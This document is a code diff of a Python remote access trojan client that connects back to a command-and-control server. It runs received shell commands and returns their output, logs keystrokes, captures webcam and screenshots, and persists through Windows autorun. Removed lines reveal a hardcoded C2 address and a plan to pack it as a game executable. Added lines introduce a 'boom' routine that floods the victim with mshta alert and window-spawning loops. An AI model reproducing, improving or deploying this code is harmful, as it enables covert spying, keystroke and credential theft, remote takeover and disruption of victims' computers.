@@ -11,12 +11,10 @@ import subprocess
 import threading
 from pynput import keyboard
 
-CCIP = "172.211.240.85"  # C2 SERVER IP
-CCPORT = 4444  # C2 SERVER PORT
+CCIP = ""  # C2 SERVER IP
+CCPORT =   # C2 SERVER PORT
 
 # packing
-# runfile = sys.MEIPASS + "/League of legends.exe"
-# subprocess.Popen(runfile, shell=True)
 
 
 # autorun function that makes the program initiate with windows
@@ -39,7 +37,7 @@ def data_send(data, client):
         print(f"Error sending data: {e}")
 
 
-def data_recv(client, timeout=60):
+def data_recv(client, timeout=120):
     data = ''
     client.settimeout(timeout)
     while True:
@@ -100,6 +98,19 @@ def screenshot(client):
     finally:
         if os.path.exists('screenshot.png'):
             os.remove('screenshot.png')
+
+
+def boom():
+    commands = [
+        'mshta "javascript:for (var i = 0; i < 10; i++) { alert(\'HACKED!!! HACKED!!! HACKED!!! HACKED!!!\'); } window.close();"',
+        'mshta "javascript:for (var i = 0; i < 10000000; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
+    ]
+
+    for command in commands:
+        try:
+            subprocess.run(command, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error: {e}")
 
 
 def keylogger_start(client):
@@ -171,23 +182,28 @@ def capture_cam(client):
         cv2.destroyAllWindows()
 
 
-def cmd(client, data):
+def cmd(command, client):
     try:
-        proc = subprocess.Popen(
-            data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = proc.communicate()
-        response = (output + "\n" + error).encode('latin-1')
-        client.sendall(response)
-    except Exception as e:
-        print(f"Error: {e}")
+        exe = subprocess.Popen(
+            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+        )
+        output, err = exe.communicate()
+
+        comm = output + err + b'\n'
+
+        comm_str = comm.decode('latin-1')
+
+        data_send(comm_str, client)
+    except Exception:
+        pass
 
 
 def shell(client):
     while True:
         try:
             comm = data_recv(client)
-            if comm == 'exit':
-                break
+            if comm == '/exit':
+                return
             elif comm == 'clear':
                 pass
             elif comm[:3] == 'cd ':
@@ -205,16 +221,14 @@ def shell(client):
                 keylogger_thread.start()
             elif comm[:6] == 'webcam':
                 capture_cam(client)
+            elif comm[:4] == 'boom':
+                boom()
             elif comm == 'help':
                 pass
             else:
-                exe = subprocess.Popen(
-                    comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                rcomm = exe.stdout.read() + exe.stderr.read()
-                rcomm = rcomm.decode('latin-1')
-                data_send(rcomm, client)
-        except Exception as e:
-            print(f"Error in shell command: {e}")
+                threading.Thread(target=cmd, args=(comm, client)).start()
+        except KeyboardInterrupt:
+            conn(CCIP, CCPORT)
 
 
 def conn(ccip, ccport):
@@ -223,7 +237,7 @@ def conn(ccip, ccport):
         client.connect((ccip, ccport))
         return client
     except Exception as e:
-        print(f"Error connecting to server: {e}")
+        print(f"Error: {e}")
 
 
 if __name__ == "__main__":
@@ -231,7 +245,11 @@ if __name__ == "__main__":
     while True:
         client = conn(CCIP, CCPORT)
         if client:
-            shell(client)
-            client.close()
+            try:
+                shell(client)
+            except Exception:
+                pass
+            finally:
+                client.close()
         else:
             time.sleep(3)
